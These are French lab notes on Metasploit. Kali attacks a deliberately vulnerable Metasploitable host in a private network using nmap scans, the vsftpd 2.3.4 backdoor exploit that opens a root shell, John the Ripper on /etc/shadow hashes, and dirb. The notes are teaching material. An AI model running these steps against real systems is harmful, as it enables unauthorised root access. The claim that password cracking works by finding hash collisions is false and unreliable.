# Metasploit

TP réalisé dans l'infrastructure virtuelle suivante :

- réseau : 172.16.0.0/24

- Metasploitable : 172.16.0.102/24

- Kali Linux : 172.16.0.30/24

Sur la Kali :

Entrer dans la console metasploit : `msfconsole`

Commandes :

```bash
search $service
# par exemple
info exploit/linux/http/librenms_collectd_cmd_inject
use exploit/linux/http/librenms_collectd_cmd_inject
options # affiche les paramètres
set RHOST $une_adresse # définir l'adresse de la machine ciblée
```

# Cartographier le réseau

nmap :

```bash
nmap $réseau
nmap -sV $hôte_ciblé
nmap -sV $hôte_ciblé -p $ports_ciblés
```

# Exploitation d'une faille par metasploit

Une fois que la cible est repérée ainsi qu'un de ses ports faillibles ouverts, on lance l'exploit. Dans notre cas, la vulnérabilité est une porte dérobée de vsftpd.

```bash
use unix/ftp/vsftpd_234_backdoor
set RHOST 172.16.0.102
exploit
```

Et s'ouvre un shell en tant que root.

## Forcer le mot de passe

> /etc/passwd contient les infos des utilisateurs, mais pas leurs mot de passe. Les hash des mots de passe sont listés dans /etc/shadow.

On ne connaît pas le mot de passe, et on ne peut pas traduire le hash en mot de passe. Mais Linux ne compare pas l'entrée de l'utilisateur avec les mots de passe eux-mêmes, mais leur hash.

L'idée est de trouver une collision. C'est-à-dire une valeur autre que le véritable mot de passe, dont le hash est identique à celui du mot de passe original.

On peut utiliser John the ripper.

# Scanner un site web

L'utilitaire *dirb* inspecte l'entièreté du répertoire servi par le service web. On peut donc cartographier le site web. Parmi les fichiers trouvables avec *dirb*, on peut relever un fichier fréquent, *phpinfo.php* qui donne la version de php utilisée par le serveur.




